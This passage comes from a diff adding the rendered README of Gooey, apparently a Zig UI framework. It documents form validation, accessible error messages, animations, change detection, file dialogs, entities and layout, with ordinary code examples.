+            <span>1</span> <span>=</span><span>&gt;</span> <span>ui</span>.<span>text</span>(<span>data</span>[<span>row</span>].<span>name</span>, .{ .<span>color</span> <span>=</span> <span>theme</span>.<span>text</span> }),
+            <span>2</span> <span>=</span><span>&gt;</span> <span>ui</span>.<span>text</span>(<span>data</span>[<span>row</span>].<span>status</span>, .{ .<span>color</span> <span>=</span> <span>theme</span>.<span>text</span> }),
+            <span>else</span> <span>=</span><span>&gt;</span> <span>ui</span>.<span>text</span>(<span>&#34;—&#34;</span>, .{}),
+        },
+    }));
+}</pre></div>
+<p dir="auto"><h2 tabindex="-1" dir="auto">Form Validation</h2><a aria-label="Permalink: Form Validation" href="#form-validation" id="user-content-form-validation"></a></p>
+<p dir="auto">Gooey provides utilities for form validation with touched-state tracking:</p>
+<p dir="auto"><h3 tabindex="-1" dir="auto">Validation Utilities</h3><a aria-label="Permalink: Validation Utilities" href="#validation-utilities" id="user-content-validation-utilities"></a></p>
+<div dir="auto" data-snippet-clipboard-copy-content="const validation = gooey.validation;
+
+// Single validators
+const err = validation.required(value);           // Non-empty check
+const err = validation.email(value);              // Email format
+const err = validation.minLength(value, 8);       // Minimum length
+const err = validation.maxLength(value, 100);     // Maximum length
+const err = validation.numeric(value);            // Digits only
+const err = validation.alphanumeric(value);       // Letters and numbers
+const err = validation.matches(value, other);     // Values must match
+
+// Password strength
+const err = validation.hasUppercase(value);       // At least one uppercase
+const err = validation.hasLowercase(value);       // At least one lowercase
+const err = validation.hasDigit(value);           // At least one number
+const err = validation.hasSpecialChar(value);     // At least one special char
+
+// Chain multiple validators - returns first error or null
+const err = validation.all(password, .{
+    validation.required,
+    validation.minLengthValidator(8),
+    validation.hasUppercase,
+    validation.hasDigit,
+});"><pre><span>const</span> <span>validation</span> <span>=</span> <span>gooey</span>.<span>validation</span>;
+
+<span>// Single validators</span>
+<span>const</span> <span>err</span> <span>=</span> <span>validation</span>.<span>required</span>(<span>value</span>);           <span>// Non-empty check</span>
+<span>const</span> <span>err</span> <span>=</span> <span>validation</span>.<span>email</span>(<span>value</span>);              <span>// Email format</span>
+<span>const</span> <span>err</span> <span>=</span> <span>validation</span>.<span>minLength</span>(<span>value</span>, <span>8</span>);       <span>// Minimum length</span>
+<span>const</span> <span>err</span> <span>=</span> <span>validation</span>.<span>maxLength</span>(<span>value</span>, <span>100</span>);     <span>// Maximum length</span>
+<span>const</span> <span>err</span> <span>=</span> <span>validation</span>.<span>numeric</span>(<span>value</span>);            <span>// Digits only</span>
+<span>const</span> <span>err</span> <span>=</span> <span>validation</span>.<span>alphanumeric</span>(<span>value</span>);       <span>// Letters and numbers</span>
+<span>const</span> <span>err</span> <span>=</span> <span>validation</span>.<span>matches</span>(<span>value</span>, <span>other</span>);     <span>// Values must match</span>
+
+<span>// Password strength</span>
+<span>const</span> <span>err</span> <span>=</span> <span>validation</span>.<span>hasUppercase</span>(<span>value</span>);       <span>// At least one uppercase</span>
+<span>const</span> <span>err</span> <span>=</span> <span>validation</span>.<span>hasLowercase</span>(<span>value</span>);       <span>// At least one lowercase</span>
+<span>const</span> <span>err</span> <span>=</span> <span>validation</span>.<span>hasDigit</span>(<span>value</span>);           <span>// At least one number</span>
+<span>const</span> <span>err</span> <span>=</span> <span>validation</span>.<span>hasSpecialChar</span>(<span>value</span>);     <span>// At least one special char</span>
+
+<span>// Chain multiple validators - returns first error or null</span>
+<span>const</span> <span>err</span> <span>=</span> <span>validation</span>.<span>all</span>(<span>password</span>, .{
+    <span>validation</span>.<span>required</span>,
+    <span>validation</span>.<span>minLengthValidator</span>(<span>8</span>),
+    <span>validation</span>.<span>hasUppercase</span>,
+    <span>validation</span>.<span>hasDigit</span>,
+});</pre></div>
+<p dir="auto"><h3 tabindex="-1" dir="auto">Custom Messages (i18n)</h3><a aria-label="Permalink: Custom Messages (i18n)" href="#custom-messages-i18n" id="user-content-custom-messages-i18n"></a></p>
+<p dir="auto">Create validators with custom messages for internationalization:</p>
+<div dir="auto" data-snippet-clipboard-copy-content="// Define a locale struct with custom validators
+const french = struct {
+    pub const required = validation.requiredMsg(&#34;Ce champ est requis&#34;);
+    pub const email = validation.emailMsg(&#34;Adresse e-mail invalide&#34;);
+    pub const minLength8 = validation.minLengthMsg(8, &#34;Au moins 8 caractères&#34;);
+    pub const hasUppercase = validation.hasUppercaseMsg(&#34;Au moins une majuscule&#34;);
+};
+
+// Use in validation - works with all() combinator
+const err = validation.all(value, .{
+    french.required,
+    french.email,
+});
+
+// Available message factories:
+// validation.requiredMsg(msg)
+// validation.emailMsg(msg)
+// validation.minLengthMsg(min, msg)
+// validation.maxLengthMsg(max, msg)
+// validation.numericMsg(msg)
+// validation.alphanumericMsg(msg)
+// validation.hasUppercaseMsg(msg)
+// validation.hasLowercaseMsg(msg)
+// validation.hasDigitMsg(msg)
+// validation.hasSpecialCharMsg(msg)
+// validation.matchesMsg(msg)"><pre><span>// Define a locale struct with custom validators</span>
+<span>const</span> <span>french</span> <span>=</span> <span>struct</span> {
+    <span>pub</span> <span>const</span> <span>required</span> <span>=</span> <span>validation</span>.<span>requiredMsg</span>(<span>&#34;Ce champ est requis&#34;</span>);
+    <span>pub</span> <span>const</span> <span>email</span> <span>=</span> <span>validation</span>.<span>emailMsg</span>(<span>&#34;Adresse e-mail invalide&#34;</span>);
+    <span>pub</span> <span>const</span> <span>minLength8</span> <span>=</span> <span>validation</span>.<span>minLengthMsg</span>(<span>8</span>, <span>&#34;Au moins 8 caractères&#34;</span>);
+    <span>pub</span> <span>const</span> <span>hasUppercase</span> <span>=</span> <span>validation</span>.<span>hasUppercaseMsg</span>(<span>&#34;Au moins une majuscule&#34;</span>);
+};
+
+<span>// Use in validation - works with all() combinator</span>
+<span>const</span> <span>err</span> <span>=</span> <span>validation</span>.<span>all</span>(<span>value</span>, .{
+    <span>french</span>.<span>required</span>,
+    <span>french</span>.<span>email</span>,
+});
+
+<span>// Available message factories:</span>
+<span>// validation.requiredMsg(msg)</span>
+<span>// validation.emailMsg(msg)</span>
+<span>// validation.minLengthMsg(min, msg)</span>
+<span>// validation.maxLengthMsg(max, msg)</span>
+<span>// validation.numericMsg(msg)</span>
+<span>// validation.alphanumericMsg(msg)</span>
+<span>// validation.hasUppercaseMsg(msg)</span>
+<span>// validation.hasLowercaseMsg(msg)</span>
+<span>// validation.hasDigitMsg(msg)</span>
+<span>// validation.hasSpecialCharMsg(msg)</span>
+<span>// validation.matchesMsg(msg)</span></pre></div>
+<p dir="auto"><h3 tabindex="-1" dir="auto">Error Codes (Programmatic Handling)</h3><a aria-label="Permalink: Error Codes (Programmatic Handling)" href="#error-codes-programmatic-handling" id="user-content-error-codes-programmatic-handling"></a></p>
+<p dir="auto">Use error codes when you need to programmatically handle errors (e.g., focus first invalid field):</p>
+<div dir="auto" data-snippet-clipboard-copy-content="// Returns ?ErrorCode instead of ?[]const u8
+const code = validation.requiredCode(value);
+if (code == .required) {
+    cx.setFocus(&#34;username&#34;);  // Focus first invalid field
+}
+
+// Available error codes:
+// .required, .min_length, .max_length, .invalid_email,
+// .not_numeric, .not_alphanumeric, .mismatch,
+// .no_uppercase, .no_lowercase, .no_digit, .no_special_char
+
+// Find first invalid field - call individual *Code functions in sequence
+// (there&#39;s no allCode() combinator; this pattern keeps the API simple)
+pub fn getFirstInvalidField(s: *const State) ?[]const u8 {
+    if (validation.requiredCode(s.username) != null) return &#34;username&#34;;
+    if (validation.emailCode(s.email) != null) return &#34;email&#34;;
+    if (validation.minLengthCode(s.password, 8) != null) return &#34;password&#34;;
+    return null;
+}"><pre><span>// Returns ?ErrorCode instead of ?[]const u8</span>
+<span>const</span> <span>code</span> <span>=</span> <span>validation</span>.<span>requiredCode</span>(<span>value</span>);
+<span>if</span> (<span>code</span> <span>==</span> <span>.required</span>) {
+    <span>cx</span>.<span>setFocus</span>(<span>&#34;username&#34;</span>);  <span>// Focus first invalid field</span>
+}
+
+<span>// Available error codes:</span>
+<span>// .required, .min_length, .max_length, .invalid_email,</span>
+<span>// .not_numeric, .not_alphanumeric, .mismatch,</span>
+<span>// .no_uppercase, .no_lowercase, .no_digit, .no_special_char</span>
+
+<span>// Find first invalid field - call individual *Code functions in sequence</span>
+<span>// (there&#39;s no allCode() combinator; this pattern keeps the API simple)</span>
+<span>pub</span> <span>fn</span> <span>getFirstInvalidField</span>(<span>s</span>: <span>*</span><span>const</span> <span>State</span>) <span>?</span>[]<span>const</span> <span>u8</span> {
+    <span>if</span> (<span>validation</span>.<span>requiredCode</span>(<span>s</span>.<span>username</span>) <span>!=</span> <span>null</span>) <span>return</span> <span>&#34;username&#34;</span>;
+    <span>if</span> (<span>validation</span>.<span>emailCode</span>(<span>s</span>.<span>email</span>) <span>!=</span> <span>null</span>) <span>return</span> <span>&#34;email&#34;</span>;
+    <span>if</span> (<span>validation</span>.<span>minLengthCode</span>(<span>s</span>.<span>password</span>, <span>8</span>) <span>!=</span> <span>null</span>) <span>return</span> <span>&#34;password&#34;</span>;
+    <span>return</span> <span>null</span>;
+}</pre></div>
+<blockquote>
+<p dir="auto"><strong>Note:</strong> Unlike <code>all()</code> for error messages, there&#39;s no <code>allCode()</code> combinator.
+For multi-field validation with error codes, call individual <code>*Code</code> functions
+in sequence as shown above. This keeps the API simple while covering the
+common &#34;focus first invalid field&#34; use case.</p>
+</blockquote>
+<p dir="auto"><h3 tabindex="-1" dir="auto">Structured Results (Full Accessibility Control)</h3><a aria-label="Permalink: Structured Results (Full Accessibility Control)" href="#structured-results-full-accessibility-control" id="user-content-structured-results-full-accessibility-control"></a></p>
+<p dir="auto">When you need different messages for visual display vs screen readers:</p>
+<div dir="auto" data-snippet-clipboard-copy-content="// Structured result with separate messages
+const result = validation.requiredResult(value, .{
+    .message = &#34;Required&#34;,  // Terse for visual display
+    .accessible_message = &#34;The email field is required. Please enter your email address.&#34;,
+});
+
+if (result) |r| {
+    r.code              // ErrorCode for programmatic handling
+    r.displayMessage()  // Message for visual display
+    r.screenReaderMessage()  // Message for screen readers (falls back to display)
+}
+
+// Use with ValidatedTextInput for full a11y control
+gooey.ValidatedTextInput{
+    .id = &#34;email&#34;,
+    .error_result = validation.requiredResult(s.email, .{
+        .message = &#34;Required&#34;,
+        .accessible_message = &#34;The email address field is required&#34;,
+    }),
+    .show_error = s.touched_email,
+}"><pre><span>// Structured result with separate messages</span>
+<span>const</span> <span>result</span> <span>=</span> <span>validation</span>.<span>requiredResult</span>(<span>value</span>, .{
+    .<span>message</span> <span>=</span> <span>&#34;Required&#34;</span>,  <span>// Terse for visual display</span>
+    .<span>accessible_message</span> <span>=</span> <span>&#34;The email field is required. Please enter your email address.&#34;</span>,
+});
+
+<span>if</span> (<span>result</span>) <span>|</span><span>r</span><span>|</span> {
+    <span>r</span>.<span>code</span>              <span>// ErrorCode for programmatic handling</span>
+    <span>r</span>.<span>displayMessage</span>()  <span>// Message for visual display</span>
+    <span>r</span>.<span>screenReaderMessage</span>()  <span>// Message for screen readers (falls back to display)</span>
+}
+
+<span>// Use with ValidatedTextInput for full a11y control</span>
+<span>gooey.ValidatedTextInput</span>{
+    .<span>id</span> <span>=</span> <span>&#34;email&#34;</span>,
+    .<span>error_result</span> <span>=</span> <span>validation</span>.<span>requiredResult</span>(<span>s</span>.<span>email</span>, .{
+        .<span>message</span> <span>=</span> <span>&#34;Required&#34;</span>,
+        .<span>accessible_message</span> <span>=</span> <span>&#34;The email address field is required&#34;</span>,
+    }),
+    .<span>show_error</span> <span>=</span> <span>s</span>.<span>touched_email</span>,
+}</pre></div>
+<p dir="auto"><h3 tabindex="-1" dir="auto">ValidatedTextInput Component</h3><a aria-label="Permalink: ValidatedTextInput Component" href="#validatedtextinput-component" id="user-content-validatedtextinput-component"></a></p>
+<p dir="auto">All-in-one form field with label, input, error display, and help text:</p>
+<div dir="auto" data-snippet-clipboard-copy-content="const State = struct {
+    email: []const u8 = &#34;&#34;,
+    touched_email: bool = false,
+
+    pub fn validateEmail(self: *const State) ?[]const u8 {
+        return gooey.validation.all(self.email, .{
+            gooey.validation.required,
+            gooey.validation.email,
+        });
+    }
+
+    pub fn onEmailBlur(self: *State) void {
+        self.touched_email = true;
+    }
+};
+
+// In render:
+gooey.ValidatedTextInput{
+    .id = &#34;email&#34;,
+    .label = &#34;Email Address&#34;,
+    .required_indicator = true,        // Shows &#34;*&#34; after label
+    .placeholder = &#34;you@example.com&#34;,
+    .bind = &amp;s.email,
+    .error_message = s.validateEmail(),  // Simple string error
+    .show_error = s.touched_email,       // Only show after interaction
+    .help_text = &#34;We&#39;ll never share your email&#34;,
+    .on_blur_handler = cx.update(State.onEmailBlur),
+    .width = 300,
+}
+
+// Or with structured result for different a11y messages:
+gooey.ValidatedTextInput{
+    .id = &#34;email&#34;,
+    .label = &#34;Email Address&#34;,
+    .error_result = validation.emailResult(s.email, .{
+        .message = &#34;Invalid email&#34;,
+        .accessible_message = &#34;Please enter a valid email address in the format name@example.com&#34;,
+    }),
+    .show_error = s.touched_email,
+}"><pre><span>const</span> <span>State</span> <span>=</span> <span>struct</span> {
+    <span>email</span>: []<span>const</span> <span>u8</span> <span>=</span> <span>&#34;&#34;</span>,
+    <span>touched_email</span>: <span>bool</span> <span>=</span> <span>false</span>,
+
+    <span>pub</span> <span>fn</span> <span>validateEmail</span>(<span>self</span>: <span>*</span><span>const</span> <span>State</span>) <span>?</span>[]<span>const</span> <span>u8</span> {
+        <span>return</span> <span>gooey</span>.<span>validation</span>.<span>all</span>(<span>self</span>.<span>email</span>, .{
+            <span>gooey</span>.<span>validation</span>.<span>required</span>,
+            <span>gooey</span>.<span>validation</span>.<span>email</span>,
+        });
+    }
+
+    <span>pub</span> <span>fn</span> <span>onEmailBlur</span>(<span>self</span>: <span>*</span><span>State</span>) <span>void</span> {
+        <span>self</span>.<span>touched_email</span> <span>=</span> <span>true</span>;
+    }
+};
+
+<span>// In render:</span>
+<span>gooey.ValidatedTextInput</span>{
+    .<span>id</span> <span>=</span> <span>&#34;email&#34;</span>,
+    .<span>label</span> <span>=</span> <span>&#34;Email Address&#34;</span>,
+    .<span>required_indicator</span> <span>=</span> <span>true</span>,        <span>// Shows &#34;*&#34; after label</span>
+    .<span>placeholder</span> <span>=</span> <span>&#34;you@example.com&#34;</span>,
+    .<span>bind</span> <span>=</span> <span>&amp;</span><span>s</span>.<span>email</span>,
+    .<span>error_message</span> <span>=</span> <span>s</span>.<span>validateEmail</span>(),  <span>// Simple string error</span>
+    .<span>show_error</span> <span>=</span> <span>s</span>.<span>touched_email</span>,       <span>// Only show after interaction</span>
+    .<span>help_text</span> <span>=</span> <span>&#34;We&#39;ll never share your email&#34;</span>,
+    .<span>on_blur_handler</span> <span>=</span> <span>cx</span>.<span>update</span>(<span>State</span>.<span>onEmailBlur</span>),
+    .<span>width</span> <span>=</span> <span>300</span>,
+}
+
+<span>// Or with structured result for different a11y messages:</span>
+<span>gooey.ValidatedTextInput</span>{
+    .<span>id</span> <span>=</span> <span>&#34;email&#34;</span>,
+    .<span>label</span> <span>=</span> <span>&#34;Email Address&#34;</span>,
+    .<span>error_result</span> <span>=</span> <span>validation</span>.<span>emailResult</span>(<span>s</span>.<span>email</span>, .{
+        .<span>message</span> <span>=</span> <span>&#34;Invalid email&#34;</span>,
+        .<span>accessible_message</span> <span>=</span> <span>&#34;Please enter a valid email address in the format name@example.com&#34;</span>,
+    }),
+    .<span>show_error</span> <span>=</span> <span>s</span>.<span>touched_email</span>,
+}</pre></div>
+<p dir="auto"><h3 tabindex="-1" dir="auto">Form-Level Helpers</h3><a aria-label="Permalink: Form-Level Helpers" href="#form-level-helpers" id="user-content-form-level-helpers"></a></p>
+<div dir="auto" data-snippet-clipboard-copy-content="// Track errors for multiple fields
+var errors = validation.FormErrors(4).init();
+errors.set(0, validation.required(s.username));
+errors.set(1, validation.email(s.email));
+errors.set(2, validation.minLength(s.password, 8));
+errors.set(3, validation.matches(s.confirm, s.password));
+
+if (errors.isValid()) {
+    // Submit form
+} else {
+    // errors.firstErrorIndex() returns index of first invalid field
+}
+
+// Track touched state
+var touched = validation.TouchedFields(4).init();
+touched.touch(0);  // Mark field 0 as touched
+if (touched.isTouched(0)) { ... }
+touched.touchAll();  // Mark all on submit
+touched.reset();     // Clear on form reset"><pre><span>// Track errors for multiple fields</span>
+<span>var</span> <span>errors</span> <span>=</span> <span>validation</span>.<span>FormErrors</span>(<span>4</span>).<span>init</span>();
+<span>errors</span>.<span>set</span>(<span>0</span>, <span>validation</span>.<span>required</span>(<span>s</span>.<span>username</span>));
+<span>errors</span>.<span>set</span>(<span>1</span>, <span>validation</span>.<span>email</span>(<span>s</span>.<span>email</span>));
+<span>errors</span>.<span>set</span>(<span>2</span>, <span>validation</span>.<span>minLength</span>(<span>s</span>.<span>password</span>, <span>8</span>));
+<span>errors</span>.<span>set</span>(<span>3</span>, <span>validation</span>.<span>matches</span>(<span>s</span>.<span>confirm</span>, <span>s</span>.<span>password</span>));
+
+<span>if</span> (<span>errors</span>.<span>isValid</span>()) {
+    <span>// Submit form</span>
+} <span>else</span> {
+    <span>// errors.firstErrorIndex() returns index of first invalid field</span>
+}
+
+<span>// Track touched state</span>
+<span>var</span> <span>touched</span> <span>=</span> <span>validation</span>.<span>TouchedFields</span>(<span>4</span>).<span>init</span>();
+<span>touched</span>.<span>touch</span>(<span>0</span>);  <span>// Mark field 0 as touched</span>
+<span>if</span> (<span>touched</span>.<span>isTouched</span>(<span>0</span>)) { <span>...</span> }
+<span>touched</span>.<span>touchAll</span>();  <span>// Mark all on submit</span>
+<span>touched</span>.<span>reset</span>();     <span>// Clear on form reset</span></pre></div>
+<p dir="auto">Run <code>zig build run-form-validation</code> for a complete example.</p>
+<p dir="auto"><h2 tabindex="-1" dir="auto">Animation System</h2><a aria-label="Permalink: Animation System" href="#animation-system" id="user-content-animation-system"></a></p>
+<p dir="auto">Built-in animation support with easing functions:</p>
+<div dir="auto" data-snippet-clipboard-copy-content="// Simple animation (runs once on mount)
+const fade = cx.animate(&#34;fade-in&#34;, .{ .duration_ms = 500 });
+// fade.progress goes 0.0 -&gt; 1.0
+
+// Animation that restarts when a value changes
+const pulse = cx.animateOn(&#34;counter-pulse&#34;, s.count, .{
+    .duration_ms = 200,
+    .easing = Easing.easeOutBack,
+});
+
+// Continuous animation
+const spin = cx.animate(&#34;spinner&#34;, .{
+    .duration_ms = 1000,
+    .mode = .ping_pong,  // or .loop
+});
+
+// Use animation values
+cx.render(ui.box(.{
+    .background = Color.white.withAlpha(fade.progress),
+    .width = gooey.lerp(100.0, 150.0, pulse.progress),
+}, .{...}));"><pre><span>// Simple animation (runs once on mount)</span>
+<span>const</span> <span>fade</span> <span>=</span> <span>cx</span>.<span>animate</span>(<span>&#34;fade-in&#34;</span>, .{ .<span>duration_ms</span> <span>=</span> <span>500</span> });
+<span>// fade.progress goes 0.0 -&gt; 1.0</span>
+
+<span>// Animation that restarts when a value changes</span>
+<span>const</span> <span>pulse</span> <span>=</span> <span>cx</span>.<span>animateOn</span>(<span>&#34;counter-pulse&#34;</span>, <span>s</span>.<span>count</span>, .{
+    .<span>duration_ms</span> <span>=</span> <span>200</span>,
+    .<span>easing</span> <span>=</span> <span>Easing</span>.<span>easeOutBack</span>,
+});
+
+<span>// Continuous animation</span>
+<span>const</span> <span>spin</span> <span>=</span> <span>cx</span>.<span>animate</span>(<span>&#34;spinner&#34;</span>, .{
+    .<span>duration_ms</span> <span>=</span> <span>1000</span>,
+    .<span>mode</span> <span>=</span> <span>.ping_pong</span>,  <span>// or .loop</span>
+});
+
+<span>// Use animation values</span>
+<span>cx</span>.<span>render</span>(<span>ui</span>.<span>box</span>(.{
+    .<span>background</span> <span>=</span> <span>Color</span>.<span>white</span>.<span>withAlpha</span>(<span>fade</span>.<span>progress</span>),
+    .<span>width</span> <span>=</span> <span>gooey</span>.<span>lerp</span>(<span>100.0</span>, <span>150.0</span>, <span>pulse</span>.<span>progress</span>),
+}, .{<span>...</span>}));</pre></div>
+<p dir="auto"><strong>Available Easings:</strong> <code>linear</code>, <code>easeIn</code>, <code>easeOut</code>, <code>easeInOut</code>, <code>easeOutBack</code>, <code>easeOutCubic</code>, <code>easeInOutCubic</code></p>
+<p dir="auto"><h2 tabindex="-1" dir="auto">Change Detection</h2><a aria-label="Permalink: Change Detection" href="#change-detection" id="user-content-change-detection"></a></p>
+<p dir="auto"><code>cx.changed()</code> detects when a value changes between frames — replacing the common pattern of module-level <code>var last_foo: ?T = null</code> with manual diffing:</p>
+<div dir="auto" data-snippet-clipboard-copy-content="// Invalidate caches when dependencies change
+if (cx.changed(&#34;dark_mode&#34;, s.dark_mode) or cx.changed(&#34;window_width&#34;, size.width)) {
+    s.invalidateCachedHeights();
+}"><pre><span>// Invalidate caches when dependencies change</span>
+<span>if</span> (<span>cx</span>.<span>changed</span>(<span>&#34;dark_mode&#34;</span>, <span>s</span>.<span>dark_mode</span>) <span>or</span> <span>cx</span>.<span>changed</span>(<span>&#34;window_width&#34;</span>, <span>size</span>.<span>width</span>)) {
+    <span>s</span>.<span>invalidateCachedHeights</span>();
+}</pre></div>
+<p dir="auto"><strong>Semantics:</strong></p>
+<ul dir="auto">
+<li><strong>First call</strong> for a given key → returns <code>false</code> (no previous value)</li>
+<li><strong>Same value</strong> as last frame → returns <code>false</code></li>
+<li><strong>Different value</strong> → returns <code>true</code> (and stores the new value)</li>
+</ul>
+<p dir="auto">Works with any value type: <code>bool</code>, <code>f32</code>, <code>i32</code>, enums, small structs.</p>
+<div dir="auto" data-snippet-clipboard-copy-content="// Theme change
+if (cx.changed(&#34;theme&#34;, s.theme)) {
+    s.rebuildStyles();
+}
+
+// Window resize (triggers layout recalc)
+const size = cx.windowSize();
+if (cx.changed(&#34;width&#34;, size.width)) {
+    s.onResize(size.width);
+}
+
+// Enum state
+if (cx.changed(&#34;view&#34;, s.current_view)) {
+    s.scrollToTop();
+}"><pre><span>// Theme change</span>
+<span>if</span> (<span>cx</span>.<span>changed</span>(<span>&#34;theme&#34;</span>, <span>s</span>.<span>theme</span>)) {
+    <span>s</span>.<span>rebuildStyles</span>();
+}
+
+<span>// Window resize (triggers layout recalc)</span>
+<span>const</span> <span>size</span> <span>=</span> <span>cx</span>.<span>windowSize</span>();
+<span>if</span> (<span>cx</span>.<span>changed</span>(<span>&#34;width&#34;</span>, <span>size</span>.<span>width</span>)) {
+    <span>s</span>.<span>onResize</span>(<span>size</span>.<span>width</span>);
+}
+
+<span>// Enum state</span>
+<span>if</span> (<span>cx</span>.<span>changed</span>(<span>&#34;view&#34;</span>, <span>s</span>.<span>current_view</span>)) {
+    <span>s</span>.<span>scrollToTop</span>();
+}</pre></div>
+<p dir="auto">Keys are comptime strings hashed to <code>u32</code> (same approach as the animation system). Up to 64 tracked values per app.</p>
+<p dir="auto"><h2 tabindex="-1" dir="auto">File Dialogs</h2><a aria-label="Permalink: File Dialogs" href="#file-dialogs" id="user-content-file-dialogs"></a></p>
+<p dir="auto">Cross-platform file open/save dialogs via <code>gooey.file_dialog</code>:</p>
+<div dir="auto" data-snippet-clipboard-copy-content="const file_dialog = gooey.file_dialog;
+
+// Open dialog
+if (file_dialog.promptForPaths(allocator, .{
+    .files = true,
+    .prompt = &#34;Attach&#34;,
+    .allowed_extensions = &amp;.{ &#34;txt&#34;, &#34;png&#34;, &#34;pdf&#34; },
+})) |result| {
+    defer result.deinit();
+    for (result.paths) |path| {
+        // ...
+    }
+}
+
+// Save dialog
+if (file_dialog.promptForNewPath(allocator, .{
+    .suggested_name = &#34;untitled.txt&#34;,
+    .prompt = &#34;Save&#34;,
+})) |path| {
+    defer allocator.free(path);
+    // ...
+}"><pre><span>const</span> <span>file_dialog</span> <span>=</span> <span>gooey</span>.<span>file_dialog</span>;
+
+<span>// Open dialog</span>
+<span>if</span> (<span>file_dialog</span>.<span>promptForPaths</span>(<span>allocator</span>, .{
+    .<span>files</span> <span>=</span> <span>true</span>,
+    .<span>prompt</span> <span>=</span> <span>&#34;Attach&#34;</span>,
+    .<span>allowed_extensions</span> <span>=</span> &amp;.{ <span>&#34;txt&#34;</span>, <span>&#34;png&#34;</span>, <span>&#34;pdf&#34;</span> },
+})) <span>|</span><span>result</span><span>|</span> {
+    <span>defer</span> <span>result</span>.<span>deinit</span>();
+    <span>for</span> (<span>result</span>.<span>paths</span>) <span>|</span><span>path</span><span>|</span> {
+        <span>// ...</span>
+    }
+}
+
+<span>// Save dialog</span>
+<span>if</span> (<span>file_dialog</span>.<span>promptForNewPath</span>(<span>allocator</span>, .{
+    .<span>suggested_name</span> <span>=</span> <span>&#34;untitled.txt&#34;</span>,
+    .<span>prompt</span> <span>=</span> <span>&#34;Save&#34;</span>,
+})) <span>|</span><span>path</span><span>|</span> {
+    <span>defer</span> <span>allocator</span>.<span>free</span>(<span>path</span>);
+    <span>// ...</span>
+}</pre></div>
+<ul dir="auto">
+<li><strong>macOS</strong>: NSOpenPanel / NSSavePanel (blocking)</li>
+<li><strong>Linux</strong>: XDG Desktop Portal via D-Bus (blocking)</li>
+<li><strong>WASM</strong>: Returns <code>null</code> — use <code>gooey.platform.web.file_dialog</code> for the async callback API</li>
+</ul>
+<p dir="auto">Use <code>file_dialog.supported</code> (comptime bool) for feature detection. File dialogs block the thread, so call them from a <a href="#deferred-commands">deferred command</a> to avoid deadlocks during event handling.</p>
+<p dir="auto"><h2 tabindex="-1" dir="auto">Entity System</h2><a aria-label="Permalink: Entity System" href="#entity-system" id="user-content-entity-system"></a></p>
+<p dir="auto">Dynamic creation and deletion with automatic cleanup:</p>
+<div dir="auto" data-snippet-clipboard-copy-content="const Counter = struct {
+    count: i32 = 0,
+    pub fn increment(self: *Counter) void { self.count += 1; }
+};
+
+const AppState = struct {
+    counters: [10]gooey.Entity(Counter) = ...,
+
+    // Command method - needs Gooey access for entity operations
+    pub fn addCounter(self: *AppState, g: *gooey.Gooey) void {
+        const entity = g.createEntity(Counter, .{ .count = 0 }) catch return;
+        self.counters[self.counter_count] = entity;
+        self.counter_count += 1;
+    }
+};
+
+// In render - use entityCx for entity-scoped handlers
+var entity_cx = cx.entityCx(Counter, counter_entity) orelse return;
+Button{ .label = &#34;+&#34;, .on_click_handler = entity_cx.update(Counter.increment) }
+
+// Read entity data
+if (cx.gooey().readEntity(Counter, entity)) |data| {
+    ui.textFmt(&#34;{d}&#34;, .{data.count}, .{});
+}"><pre><span>const</span> <span>Counter</span> <span>=</span> <span>struct</span> {
+    <span>count</span>: <span>i32</span> <span>=</span> <span>0</span>,
+    <span>pub</span> <span>fn</span> <span>increment</span>(<span>self</span>: <span>*</span><span>Counter</span>) <span>void</span> { <span>self</span>.<span>count</span> <span>+=</span> <span>1</span>; }
+};
+
+<span>const</span> <span>AppState</span> <span>=</span> <span>struct</span> {
+    <span>counters</span>: [<span>10</span>]<span>gooey</span>.<span>Entity</span>(<span>Counter</span>) <span>=</span> <span>...</span>,
+
+    <span>// Command method - needs Gooey access for entity operations</span>
+    <span>pub</span> <span>fn</span> <span>addCounter</span>(<span>self</span>: <span>*</span><span>AppState</span>, <span>g</span>: <span>*</span><span>gooey.Gooey</span>) <span>void</span> {
+        <span>const</span> <span>entity</span> <span>=</span> <span>g</span>.<span>createEntity</span>(<span>Counter</span>, .{ .<span>count</span> <span>=</span> <span>0</span> }) <span>catch</span> <span>return</span>;
+        <span>self</span>.<span>counters</span>[<span>self</span>.<span>counter_count</span>] <span>=</span> <span>entity</span>;
+        <span>self</span>.<span>counter_count</span> <span>+=</span> <span>1</span>;
+    }
+};
+
+<span>// In render - use entityCx for entity-scoped handlers</span>
+<span>var</span> <span>entity_cx</span> <span>=</span> <span>cx</span>.<span>entityCx</span>(<span>Counter</span>, <span>counter_entity</span>) <span>orelse</span> <span>return</span>;
+<span>Button</span>{ .<span>label</span> <span>=</span> <span>&#34;+&#34;</span>, .<span>on_click_handler</span> <span>=</span> <span>entity_cx</span>.<span>update</span>(<span>Counter</span>.<span>increment</span>) }
+
+<span>// Read entity data</span>
+<span>if</span> (<span>cx</span>.<span>gooey</span>().<span>readEntity</span>(<span>Counter</span>, <span>entity</span>)) <span>|</span><span>data</span><span>|</span> {
+    <span>ui</span>.<span>textFmt</span>(<span>&#34;{d}&#34;</span>, .{<span>data</span>.<span>count</span>}, .{});
+}</pre></div>
+<p dir="auto"><h2 tabindex="-1" dir="auto">Layout System</h2><a aria-label="Permalink: Layout System" href="#layout-system" id="user-content-layout-system"></a></p>
+<p dir="auto">Flexbox-inspired layout with shrink behavior and text wrapping:</p>
+<div dir="auto" data-snippet-clipboard-copy-content="cx.render(ui.box(.{
+    .direction = .row,           // or .column
+    .gap = 16,
+    .padding = .{ .all = 24 },   // or .symmetric, .each
+    .alignment = .{ .main = .space_between, .cross = .center },
+    .fill_width = true,
+    .grow = true,
+}, .{...}));
+
+// Childless boxes — use ui.rect() for dividers, spacers, colored blocks
+ui.rect(.{ .width = 1, .height = 18, .background = t.border })  // divider
+ui.rect(.{ .grow = true })                                       // spacer
+ui.rect(.{ .width = 40, .height = 40, .background = color, .corner_radius = 4 })
+
+// Shrink behavior - elements shrink when container is too small
+cx.render(ui.box(.{ .width = 150, .min_width = 60 }, .{...}));
+
+// Text wrapping
+ui.text(&#34;Long text...&#34;, .{ .wrap = .words });  // .none, .words, .newlines"><pre><span>cx</span>.<span>render</span>(<span>ui</span>.<span>box</span>(.{
+    .<span>direction</span> <span>=</span> <span>.row</span>,           <span>// or .column</span>
+    .<span>gap</span> <span>=</span> <span>16</span>,
+    .<span>padding</span> <span>=</span> .{ .<span>all</span> <span>=</span> <span>24</span> },   <span>// or .symmetric, .each</span>
